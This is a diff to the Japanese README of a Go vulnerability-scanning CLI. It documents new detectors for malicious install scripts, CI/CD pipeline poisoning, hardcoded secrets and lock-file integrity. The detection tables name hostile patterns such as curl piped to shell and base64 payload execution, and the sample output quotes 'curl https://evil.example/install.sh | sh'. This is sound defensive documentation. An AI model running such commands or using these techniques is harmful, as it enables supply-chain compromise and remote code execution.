@@ -2,7 +2,7 @@
 
 [English README](README.md)
 
-Linux/Windows サーバや Docker コンテナイメージの OS パッケージ（RPM, DPKG）および OSS エコシステム（PyPI, npm/yarn/pnpm）をスキャンし、脆弱性 API に問い合わせて既知の脆弱性を検出する Go 製 CLI ツール。API なしで動作するローカルセキュリティ検知として、**GlassWorm**（不可視文字によるマルウェア混入）と **Dependency Confusion（Shai-hulud）** の検出にも対応。
+Linux/Windows サーバや Docker コンテナイメージの OS パッケージ（RPM, DPKG）および OSS エコシステム（PyPI, npm/yarn/pnpm）をスキャンし、脆弱性 API に問い合わせて既知の脆弱性を検出する Go 製 CLI ツール。API なしで動作するローカルセキュリティ検知として、**GlassWorm**（不可視文字によるマルウェア混入）、**Dependency Confusion（Shai-hulud）**、**Malicious Install Scripts**（悪意ある install スクリプト）、**CI/CD Pipeline Poisoning**（パイプライン汚染）、**Hardcoded Secrets**（シークレットのハードコード）、**Lock File Integrity**（ロックファイル整合性）の検出に対応。
 
 ## 対応エコシステム
 
@@ -119,11 +119,11 @@ HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:50
 |---|---|---|
 | `--image` | (なし) | スキャンする Docker イメージ参照 |
 | `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
-| `--skip-local` | `false` | ローカルセキュリティ検知をスキップ（GlassWorm・Dependency Confusion） |
+| `--skip-local` | `false` | ローカルセキュリティ検知をスキップ（GlassWorm・Dependency Confusion・Malicious Install・CI/CD Poisoning・Hardcoded Secrets・Lock File Integrity） |
 
 ## ローカルセキュリティ検知
 
-`scan` コマンドは API ベースの脆弱性検知に加え、ネットワークアクセスを必要としない 2 種類のローカル検知を自動実行します。
+`scan` コマンドは API ベースの脆弱性検知に加え、ネットワークアクセスを必要としない 6 種類のローカル検知を自動実行します。
 
 ### GlassWorm 検知
 
@@ -153,6 +153,80 @@ HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:50
 | `--hash=sha256:` インテグリティチェックなし | PyPI | LOW |
 | 公開 `GOPROXY` かつ内部モジュールパスを `GOPRIVATE` がカバーしていない | Go | HIGH |
 | `go.mod` にあるモジュールが `go.sum` に存在しない | Go | MEDIUM |
+
+### Malicious Install Scripts 検知
+
+npm ライフサイクルフック（`preinstall`、`postinstall`、`prepare` 等）や Python `setup.py` 内の危険なコマンドを検出します。パッケージインストール時に自動実行されるため、サプライチェーン攻撃の主要な侵入経路です。
+
+| チェック内容 | エコシステム | Severity |
+|---|---|---|
+| `curl`/`wget` の出力をシェルにパイプ（`\| sh`、`\| bash`） | npm / PyPI | CRITICAL |
+| Base64 デコードしたペイロードをシェルに実行 | npm | CRITICAL |
+| ネットワーク fetch した内容を `eval()` | npm | CRITICAL |
+| install フックで `require('child_process')` をロード | npm | HIGH |
+| ライフサイクルフック内のアウトバウンド `curl`/`wget` | npm | HIGH |
+| `node -e '...'` によるインライン実行 | npm | HIGH |
+| `setup.py` 内の `os.system()` または `subprocess.*()` | PyPI | HIGH |
+| フック内の Base64 デコード（`Buffer.from(..., 'base64')`） | npm | MEDIUM |
+| install フック内の `fetch()` アウトバウンド呼び出し | npm | MEDIUM |
+| `setup.py` 内のネットワークリクエスト | PyPI | MEDIUM |
+
+`package.json`（`node_modules/` 配下を含む）と `setup.py` を対象にスキャン。
+
+### CI/CD Pipeline Poisoning 検知
+
+ビルドパイプラインを乗っ取ったりシークレットを窃取するために使われる CI/CD 設定ファイルのパターンを検出します。
+
+| チェック内容 | 対象システム | Severity |
+|---|---|---|
+| `curl`/`wget` の出力をシェルにパイプ | 全システム | CRITICAL |
+| Base64 デコードしたペイロードをシェルに実行 | 全システム | CRITICAL |
+| ユーザー制御の GitHub イベントデータを `run:` ステップに埋め込み（スクリプトインジェクション） | GitHub Actions | CRITICAL |
+| パイプラインステップ内のアウトバウンド `curl`/`wget` | 全システム | HIGH |
+| GitHub シークレット（`${{ secrets.* }}`）をステップで直接使用（ログ漏洩リスク） | GitHub Actions | HIGH |
+| ミュータブルなブランチ参照へのアクション固定（`@main`、`@master`） | GitHub Actions | HIGH |
+| `remote: https://` によるリモートパイプライン設定読み込み | GitLab CI | HIGH |
+| `node -e` / `python -c` によるインライン実行 | 全システム | MEDIUM |
+| フルコミット SHA ではなく semver タグへのアクション固定 | GitHub Actions | MEDIUM |
+
+`.github/workflows/*.yml`、`Jenkinsfile`、`.gitlab-ci.yml`、`.circleci/config.yml`、`azure-pipelines.yml`、`bitbucket-pipelines.yml` を対象にスキャン。
+
+### Hardcoded Secrets 検知
+
+ソースコードや設定ファイルに直接コミットされた認証情報・API キーを、2 つの手法で検出します。
+
+**既知フォーマットパターン**（コンテキスト不問でフラグ）:
+
+| シークレット種別 | Severity |
+|---|---|
+| AWS Access Key ID（`AKIA...`） | CRITICAL |
+| GitHub トークン（`ghp_`、`ghs_`、`gho_`、`github_pat_`） | CRITICAL |
+| npm アクセストークン（`npm_...`） | CRITICAL |
+| Slack トークン（`xox[baprs]-...`） | CRITICAL |
+| Stripe Live シークレットキー（`sk_live_...`） | CRITICAL |
+| SendGrid API キー（`SG....`） | CRITICAL |
+| Google API キー（`AIza...`） | CRITICAL |
+| Google OAuth クライアントシークレット（`GOCSPX-...`） | CRITICAL |
+| PEM 秘密鍵ヘッダ | CRITICAL |
+| JWT（JSON Web Token） | HIGH |
+| Stripe テストシークレットキー（`sk_test_...`） | MEDIUM |
+
+**エントロピー検知**: `api_key = "..."` や `token: "..."` などの代入パターンで値を抽出し、Shannon エントロピー ≥ 4.5 bits/文字 のものをフラグ。純粋な16進数文字列（コミットハッシュ等）は除外。
+
+プレースホルダ値（`changeme`、`YOUR_KEY_HERE`、`<token>`、環境変数参照 `$MY_SECRET` 等）は自動除外。シークレット値は出力で `先頭6文字***` にマスクされ、ログへの認証情報漏洩を防止。
+
+`.go`、`.py`、`.js`、`.ts`、`.rb`、`.php`、`.java`、`.cs`、`.sh`、`.env`、`.yaml`、`.yml`、`.toml`、`.json`、`.xml`、`.ini`、`.cfg`、`.conf`、`.properties`、`.tf` を対象にスキャン。`*.example`、`*.template`、`*_test.go`、`*.spec.ts` 等はスキップ。
+
+### Lock File Integrity 検知
+
+ロックファイルの弱いハッシュや欠落を検出し、マニフェストとロックファイルのドリフト（不整合）を確認します。
+
+| チェック内容 | 対象ファイル | Severity |
+|---|---|---|
+| 直接依存が SHA-1 integrity を使用（衝突攻撃が可能な破損済みアルゴリズム） | `package-lock.json` | HIGH |
+| `package.json` に宣言されているが `package-lock.json` に存在しない | `package-lock.json` | MEDIUM |
+| `go.mod` の require にあるモジュールが `go.sum` に存在しない（未検証） | `go.sum` | MEDIUM |
+| `Pipfile.lock` のパッケージにハッシュエントリがない（インストール時に整合性検証不可） | `Pipfile.lock` | MEDIUM |
 
 ## 出力例
 
@@ -191,14 +265,22 @@ Local Security Findings
 =======================
   TYPE            FILE                                LINE  SEVERITY  DETAIL
   ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
-G glassworm       /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
-D dep-confusion   /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
-D dep-confusion   /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
+G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
+D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
+D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
+M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
+C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
+S hardcoded-secrets  /app/config/prod.go                   34  CRITICAL  AWS Access Key ID detected — AKIAIO***
+L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512
 
-G = GlassWorm (invisible/zero-width character injection)
-D = Dependency Confusion (private package resolvable from public registry)
+G = GlassWorm（不可視・ゼロ幅文字の混入）
+D = Dependency Confusion（公開レジストリから解決可能な内部パッケージ）
+M = Malicious Install（ライフサイクルフック内の危険なコマンド）
+C = CI/CD Poisoning（パイプライン設定の攻撃パターン）
+S = Hardcoded Secrets（ソースコードにコミットされた認証情報）
+L = Lock File Integrity（弱いハッシュまたはマニフェスト／ロックファイルの不整合）
 
-Local findings: 3 (1 glassworm, 2 dep-confusion)
+Local findings: 7 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 hardcoded-secrets, 1 lockfile-integrity)
 ```
 
 ### JSON 出力 (`--format json`)
